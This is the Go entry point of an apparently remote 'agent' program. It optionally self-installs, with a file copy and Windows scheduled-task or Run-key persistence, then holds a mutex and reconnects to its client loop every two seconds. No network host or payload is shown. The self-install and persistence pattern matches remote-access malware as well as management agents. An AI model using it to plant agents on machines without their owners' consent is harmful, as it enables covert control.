package main

import (
        "log"
        "time"

        "core/cmd/agent/bootstrap"
        "core/cmd/agent/config"
        "core/cmd/agent/mutex"
)

func main() {
        // When DisableBootstrap is injected as "true" at build time, the
        // self-install stage (file copy + scheduled task / Run key) is skipped
        // entirely. The agent connects immediately, exactly as if it were already
        // running from its canonical install path. Use this for environments where
        // persistence is managed externally via GPO, Intune, SCCM, or similar.
        if !config.IsTruthy(config.DisableBootstrap) {
                if bootstrap.Run() {
                        return
                }
        }

        cfg := config.Load()
        runAgent(cfg)
}

func runAgent(cfg config.Config) {
        releaseMutex, ok, err := mutex.Acquire(cfg.Mutex)
        if err != nil {
                log.Printf("[mutex] failed to initialize mutex: %v", err)
                log.Printf("[mutex] continuing without mutex protection")
                releaseMutex = func() {}
                ok = true
        }
        if !ok {
                log.Printf("[mutex] another instance is already running; exiting")
                return
        }
        defer releaseMutex()

        for {
                func() {
                        defer recoverAndLog("main", nil)
                        runClient(cfg)
                }()
                time.Sleep(2 * time.Second)
        }
}
